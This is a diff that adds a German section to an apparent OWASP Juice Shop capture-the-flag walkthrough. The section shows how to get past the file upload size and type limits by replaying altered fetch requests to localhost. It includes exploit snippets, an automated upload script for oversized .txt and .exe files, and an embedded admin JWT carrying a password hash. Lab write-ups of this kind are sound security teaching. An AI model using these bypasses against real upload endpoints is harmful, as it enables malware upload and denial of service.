@@ -744,6 +744,245 @@ function analyzeUnicodeBypass() {
 - **Unicode-Filter fehlen**: Keine Normalisierung von Unicode-Zeichen
 - **URL-Decoding Schwächen**: Inkonsistente Behandlung von encodierten Strings
 
+### 🛠️ Methode 5: Upload Size Bypass - Network Tab Manipulation
+
+```javascript
+// Upload Size Challenge: > 100KB Datei hochladen
+// Lösung über Network Tab Request Manipulation
+```
+
+### 📝 Beschreibung
+Die Juice Shop limitiert File-Uploads auf maximal 100KB. Durch Manipulation des Network-Requests kann diese Begrenzung umgangen werden.
+
+### 🔍 Schritt 1: Kleinen Upload durchführen und Network Tab analysieren
+
+```javascript
+// 1. Öffne Developer Tools → Network Tab
+// 2. Lade eine kleine Datei hoch (< 100KB)
+// 3. Finde den POST-Request zu "/file-upload"
+// 4. Rechtsklick → "Copy" → "Copy as fetch"
+
+// Beispiel des kopierten Requests:
+/*
+fetch("http://localhost:3000/file-upload", {
+  "headers": {
+    "accept": "*/*",
+    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
+  },
+  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"small.pdf\"\r\nContent-Type: application/pdf\r\n\r\n[DATEI_INHALT]\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
+  "method": "POST"
+});
+*/
+```
+
+### 🔍 Schritt 2: Request-Body Struktur verstehen
+
+```javascript
+// Multipart Form-Data Struktur:
+const requestBody = `
+------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\n
+Content-Disposition: form-data; name="file"; filename="datei.pdf"\r\n
+Content-Type: application/pdf\r\n
+\r\n
+[HIER_STEHT_DER_DATEI_INHALT]
+\r\n
+------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n
+`;
+
+// Wichtige Komponenten:
+// 1. Boundary: ----WebKitFormBoundaryqd6JDp29QkeZuhnv
+// 2. Filename: datei.pdf
+// 3. Content-Type: application/pdf
+// 4. Datei-Inhalt: Zwischen \r\n\r\n und \r\n------
+```
+
+### 🛠️ Exploit 1: Upload Size Bypass (> 100KB)
+
+```javascript
+// Erstelle eine große Datei (150KB)
+const largeContent = 'A'.repeat(150000); // 150KB Text-Inhalt
+
+// Modifizierter Request mit großer Datei
+fetch("http://localhost:3000/file-upload", {
+  "headers": {
+    "accept": "*/*",
+    "accept-language": "de-DE,de;q=0.9,en-US;q=0.8,en;q=0.7,es;q=0.6",
+    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
+    "cache-control": "no-cache",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv",
+    "pragma": "no-cache"
+  },
+  "referrer": "http://localhost:3000/",
+  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"large.pdf\"\r\nContent-Type: application/pdf\r\n\r\n" + largeContent + "\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+```
+
+### 🛠️ Exploit 2: Nicht-PDF/ZIP Datei hochladen
+
+```javascript
+// Lade eine .txt Datei hoch (sollte normalerweise blockiert werden)
+fetch("http://localhost:3000/file-upload", {
+  "headers": {
+    "accept": "*/*",
+    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
+  },
+  "referrer": "http://localhost:3000/",
+  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"malicious.txt\"\r\nContent-Type: text/plain\r\n\r\nDies ist eine Textdatei die eigentlich nicht erlaubt sein sollte!\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
+  "method": "POST",
+  "mode": "cors",
+  "credentials": "include"
+});
+```
+
+### 🛠️ Exploit 3: Kombiniert - Große Nicht-PDF Datei
+
+```javascript
+// Beide Challenges auf einmal lösen
+const bigMaliciousContent = 'Das ist kein PDF und größer als 100KB! '.repeat(3000); // ~150KB
+
+fetch("http://localhost:3000/file-upload", {
+  "headers": {
+    "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjIsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0ZXN0aW5nQGp1aWNlLXNoLm9wIiwicGFzc3dvcmQiOiJiNjE2YTY0NjA1YTA3OTQxZmJkMzE4NjhhZWEzYjU0YiIsInJvbGUiOiJhZG1pbiIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIiLCJwcm9maWxlSW1hZ2UiOiJhc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHRBZG1pbi5wbmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjUtMDctMDkgMTQ6Mzk6MjguNDExICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTc1MjE0MzEwMn0.tccFXF5kHxQ2VeejO0ASWnW8tsCvu9I1C5lsxx95h_UgxKDhU3heT_oriw3oY663sMtTdhYW4pHdqfGF_f2_FnqQF67pG24etoM7jJZBAmC11qX69_eYAT3CVNXr1I7w8zjHcInzhaWoIw2mDwYbnlD5h7e_x2Oi7aDipM9Zops",
+    "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryqd6JDp29QkeZuhnv"
+  },
+  "body": "------WebKitFormBoundaryqd6JDp29QkeZuhnv\r\nContent-Disposition: form-data; name=\"file\"; filename=\"evil.exe\"\r\nContent-Type: application/x-msdownload\r\n\r\n" + bigMaliciousContent + "\r\n------WebKitFormBoundaryqd6JDp29QkeZuhnv--\r\n",
+  "method": "POST"
+});
+```
+
+### 🔍 Vollständiger Workflow - Schritt für Schritt
+
+```javascript
+// Automatisierter Upload Size Bypass Workflow
+async function uploadSizeBypassWorkflow() {
+    console.log('🚀 Starting Upload Size Bypass Workflow...');
+    
+    // 1. Erstelle verschiedene Test-Dateien
+    const testFiles = {
+        small: 'A'.repeat(50000),      // 50KB - sollte funktionieren
+        large: 'B'.repeat(150000),     // 150KB - Upload Size Challenge
+        malicious: 'C'.repeat(120000)  // 120KB Nicht-PDF
+    };
+    
+    // 2. Base Request Template (von Network Tab kopiert)
+    const baseRequest = {
+        method: "POST",
+        headers: {
+            "authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9...", // Dein Token hier
+            "content-type": "multipart/form-data; boundary=----WebKitFormBoundaryTEST"
+        }
+    };
+    
+    // 3. Test verschiedene Upload-Szenarien
+    const scenarios = [
+        {
+            name: "Small PDF (Control)",
+            filename: "small.pdf",
+            contentType: "application/pdf",
+            content: testFiles.small
+        },
+        {
+            name: "Large PDF (Size Challenge)",
+            filename: "large.pdf", 
+            contentType: "application/pdf",
+            content: testFiles.large
+        },
+        {
+            name: "Large TXT (Type + Size Challenge)",
+            filename: "malicious.txt",
+            contentType: "text/plain",
+            content: testFiles.malicious
+        },
+        {
+            name: "Large EXE (Ultimate Challenge)",
+            filename: "virus.exe",
+            contentType: "application/x-msdownload",
+            content: testFiles.large
+        }
+    ];
+    
+    // 4. Führe Tests durch
+    for (const scenario of scenarios) {
+        console.log(`\n🧪 Testing: ${scenario.name}`);
+        console.log(`📁 Filename: ${scenario.filename}`);
+        console.log(`📋 Content-Type: ${scenario.contentType}`);
+        console.log(`📏 Size: ${scenario.content.length} bytes`);
+        
+        const body = `------WebKitFormBoundaryTEST\r\nContent-Disposition: form-data; name="file"; filename="${scenario.filename}"\r\nContent-Type: ${scenario.contentType}\r\n\r\n${scenario.content}\r\n------WebKitFormBoundaryTEST--\r\n`;
+        
+        try {
+            const response = await fetch("http://localhost:3000/file-upload", {
+                ...baseRequest,
+                body: body
+            });
+            
+            console.log(`✅ Status: ${response.status} ${response.statusText}`);
+            if (response.status === 204) {
+                console.log('🎉 Upload successful!');
+            } else {
+                console.log('❌ Upload failed');
+            }
+            
+        } catch (error) {
+            console.log('❌ Error:', error.message);
+        }
+        
+        // Kurze Pause zwischen Tests
+        await new Promise(resolve => setTimeout(resolve, 500));
+    }
+    
+    console.log('\n✅ Upload Size Bypass Workflow completed!');
+}
+
+// Starte den Workflow
+uploadSizeBypassWorkflow();
+```
+
+### 💡 Warum funktioniert dieser Bypass?
+
+1. **Client-Side Validation**: UI prüft Dateigröße nur im Frontend
+2. **Server-Side Gap**: Backend vertraut auf Frontend-Validierung
+3. **Network Request Manipulation**: Direkter API-Zugriff umgeht UI-Limits
+4. **Multipart Form-Data**: Rohe HTTP-Requests können beliebige Größen haben
+
+### 🚨 Sicherheitslücke
+
+- **Schwachstelle**: Unzureichende Server-Side File Size Validation
+- **Impact**: Upload von großen/bösartigen Dateien
+- **CVSS**: Medium (DoS via Large Files, Malware Upload)
+
+### 🛡️ Erkannte Patterns
+
+```javascript
+// Was in der Network-Analyse zu sehen war:
+const networkRequest = {
+    url: "http://localhost:3000/file-upload",
+    method: "POST",
+    status: 204,  // Success - No Content
+    headers: {
+        authorization: "Bearer eyJ0eXAiOiJKV1Q...",  // JWT Token aus localStorage
+        contentType: "multipart/form-data; boundary=----WebKit..."
+    },
+    body: "------WebKitFormBoundary...",  // Multipart Form Data
+    responseTime: "~500ms"
+};
+
+console.log('📊 Network Analysis:', networkRequest);
+```
+
+### 🎯 Pro-Tipps für Network Tab Manipulation
+
+1. **DevTools → Network → Filter**: Nur "Fetch/XHR" anzeigen
+2. **Copy as fetch**: Schnellster Weg für Request-Replikation  
+3. **Preserve Log**: Requests bei Navigation behalten
+4. **Replay Attacks**: Mehrfach ausführen für Testing
+5. **Header Manipulation**: Authorization Token austauschen
+
 ---
 
 ## 6. DOM XSS - Cross-Site Scripting Angriffe
